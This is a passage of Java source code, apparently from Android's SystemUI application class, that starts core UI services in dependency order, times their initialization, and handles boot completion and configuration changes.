        sortedStartables.putAll(mSysUIComponent.getStartables());
        sortedStartables.putAll(mSysUIComponent.getPerUserStartables());
        startServicesIfNeeded(
                sortedStartables, "StartServices", vendorComponent);
    }

    void startSecondaryUserServicesIfNeeded() {
        if (!shouldStartSecondaryUserServices()) {
            return;  // Per-user startables are handled in #startSystemUserServicesIfNeeded.
        }
        // Sort the startables so that we get a deterministic ordering.
        Map<Class<?>, Provider<CoreStartable>> sortedStartables = new TreeMap<>(
                Comparator.comparing(Class::getName));
        sortedStartables.putAll(mSysUIComponent.getPerUserStartables());
        startServicesIfNeeded(
                sortedStartables, "StartSecondaryServices", null);
    }

    protected boolean shouldStartSystemUserServices() {
        return mProcessWrapper.isSystemUser();
    }

    protected boolean shouldStartSecondaryUserServices() {
        return !mProcessWrapper.isSystemUser();
    }

    private void startServicesIfNeeded(
            Map<Class<?>, Provider<CoreStartable>> startables,
            String metricsPrefix,
            String vendorComponent) {
        if (mServicesStarted) {
            return;
        }
        mServices = new CoreStartable[startables.size() + (vendorComponent == null ? 0 : 1)];

        if (!mBootCompleteCache.isBootComplete()) {
            // check to see if maybe it was already completed long before we began
            // see ActivityManagerService.finishBooting()
            if ("1".equals(getRootComponent().getSystemPropertiesHelper()
                    .get("sys.boot_completed"))) {
                mBootCompleteCache.setBootComplete();
                if (DEBUG) {
                    Log.v(TAG, "BOOT_COMPLETED was already sent");
                }
            }
        }

        DumpManager dumpManager = mSysUIComponent.createDumpManager();

        Log.v(TAG, "Starting SystemUI services for user " +
                Process.myUserHandle().getIdentifier() + ".");
        TimingsTraceLog log = new TimingsTraceLog("SystemUIBootTiming",
                Trace.TRACE_TAG_APP);
        log.traceBegin(metricsPrefix);

        HashSet<Class<?>> startedStartables = new HashSet<>();

        log.traceBegin("Topologically start Core Startables");
        boolean startedAny = false;
        ArrayDeque<Map.Entry<Class<?>, Provider<CoreStartable>>> queue;
        ArrayDeque<Map.Entry<Class<?>, Provider<CoreStartable>>> nextQueue =
                new ArrayDeque<>(startables.entrySet());
        int numIterations = 0;

        int serviceIndex = 0;

        do {
            startedAny = false;
            queue = nextQueue;
            nextQueue = new ArrayDeque<>(startables.size());

            while (!queue.isEmpty()) {
                Map.Entry<Class<?>, Provider<CoreStartable>> entry = queue.removeFirst();

                Class<?> cls = entry.getKey();
                Set<Class<? extends CoreStartable>> deps =
                        mSysUIComponent.getStartableDependencies().get(cls);
                if (deps == null || startedStartables.containsAll(deps)) {
                    String clsName = cls.getName();
                    int i = serviceIndex;  // Copied to make lambda happy.
                    timeInitialization(
                            clsName,
                            () -> mServices[i] = startStartable(clsName, entry.getValue()),
                            log,
                            metricsPrefix);
                    startedStartables.add(cls);
                    startedAny = true;
                    serviceIndex++;
                } else {
                    nextQueue.add(entry);
                }
            }
            numIterations++;
        } while (startedAny && !nextQueue.isEmpty()); // if none were started, stop.

        if (!nextQueue.isEmpty()) { // If some startables were left over, throw an error.
            while (!nextQueue.isEmpty()) {
                Map.Entry<Class<?>, Provider<CoreStartable>> entry = nextQueue.removeFirst();
                Class<?> cls = entry.getKey();
                Set<Class<? extends CoreStartable>> deps =
                        mSysUIComponent.getStartableDependencies().get(cls);
                StringJoiner stringJoiner = new StringJoiner(", ");
                for (Class<? extends CoreStartable> c : deps) {
                    if (!startedStartables.contains(c)) {
                        stringJoiner.add(c.getName());
                    }
                }
                Log.e(TAG, "Failed to start " + cls.getName()
                        + ". Missing dependencies: [" + stringJoiner + "]");
            }

            throw new RuntimeException("Failed to start all CoreStartables. Check logcat!");
        }
        Log.i(TAG, "Topological CoreStartables completed in " + numIterations + " iterations");
        log.traceEnd();

        if (vendorComponent != null) {
            timeInitialization(
                    vendorComponent,
                    () -> mServices[mServices.length - 1] =
                            startAdditionalStartable(vendorComponent),
                    log,
                    metricsPrefix);
        }

        for (serviceIndex = 0; serviceIndex < mServices.length; serviceIndex++) {
            final CoreStartable service = mServices[serviceIndex];
            if (mBootCompleteCache.isBootComplete()) {
                notifyBootCompleted(service);
            }

            if (service.isDumpCritical()) {
                dumpManager.registerCriticalDumpable(service);
            } else {
                dumpManager.registerNormalDumpable(service);
            }
        }
        mSysUIComponent.getInitController().executePostInitTasks();
        log.traceEnd();

        mServicesStarted = true;
    }

    private static void notifyBootCompleted(CoreStartable coreStartable) {
        if (Trace.isEnabled()) {
            Trace.traceBegin(
                    Trace.TRACE_TAG_APP,
                    coreStartable.getClass().getSimpleName() + ".onBootCompleted()");
        }
        coreStartable.onBootCompleted();
        Trace.endSection();
    }

    private static void timeInitialization(String clsName, Runnable init, TimingsTraceLog log,
            String metricsPrefix) {
        long ti = System.currentTimeMillis();
        log.traceBegin(metricsPrefix + " " + clsName);
        init.run();
        log.traceEnd();

        // Warn if initialization of component takes too long
        ti = System.currentTimeMillis() - ti;
        if (ti > 1000) {
            Log.w(TAG, "Initialization of " + clsName + " took " + ti + " ms");
        }
    }

    private static CoreStartable startAdditionalStartable(String clsName) {
        CoreStartable startable;
        if (DEBUG) Log.d(TAG, "loading: " + clsName);
        if (Trace.isEnabled()) {
            Trace.traceBegin(
                    Trace.TRACE_TAG_APP, clsName + ".newInstance()");
        }
        try {
            startable = (CoreStartable) Class.forName(clsName)
                    .getDeclaredConstructor()
                    .newInstance();
        } catch (ClassNotFoundException
                 | IllegalAccessException
                 | InstantiationException
                 | NoSuchMethodException
                 | InvocationTargetException ex) {
            throw new RuntimeException(ex);
        } finally {
            Trace.endSection();
        }

        return startStartable(startable);
    }

    private static CoreStartable startStartable(String clsName, Provider<CoreStartable> provider) {
        if (DEBUG) Log.d(TAG, "loading: " + clsName);
        if (Trace.isEnabled()) {
            Trace.traceBegin(
                    Trace.TRACE_TAG_APP, "Provider<" + clsName + ">.get()");
        }
        CoreStartable startable = provider.get();
        Trace.endSection();
        return startStartable(startable);
    }

    private static CoreStartable startStartable(CoreStartable startable) {
        if (DEBUG) Log.d(TAG, "running: " + startable);
        if (Trace.isEnabled()) {
            Trace.traceBegin(
                    Trace.TRACE_TAG_APP, startable.getClass().getSimpleName() + ".start()");
        }
        startable.start();
        Trace.endSection();

        return startable;
    }

    @Override
    public void onConfigurationChanged(@NonNull Configuration newConfig) {
        if (mServicesStarted) {
            ConfigurationForwarder configForwarder = mSysUIComponent.getConfigurationForwarder();
            if (Trace.isEnabled()) {
                Trace.traceBegin(
                        Trace.TRACE_TAG_APP,
                        configForwarder.getClass().getSimpleName() + ".onConfigurationChanged()");
            }
            configForwarder.onConfigurationChanged(newConfig);
            Trace.endSection();
        }
    }

    public CoreStartable[] getServices() {
        return mServices;
    }

    @Override
    public void setContextAvailableCallback(
            @NonNull SystemUIAppComponentFactoryBase.ContextAvailableCallback callback) {
        mContextAvailableCallback = callback;
    }

    /** Update a notifications application name. */
    public static void overrideNotificationAppName(Context context, Notification.Builder n,
            boolean system) {
        final Bundle extras = new Bundle();
        String appName = system
                ? context.getString(com.android.internal.R.string.notification_app_name_system)
                : context.getString(com.android.internal.R.string.notification_app_name_settings);
        extras.putString(Notification.EXTRA_SUBSTITUTE_APP_NAME, appName);

        n.addExtras(extras);
    }

    @NonNull
    @Override
    public WMComponent getWMComponent() {
        return mInitializer.getWMComponent();
    }
}
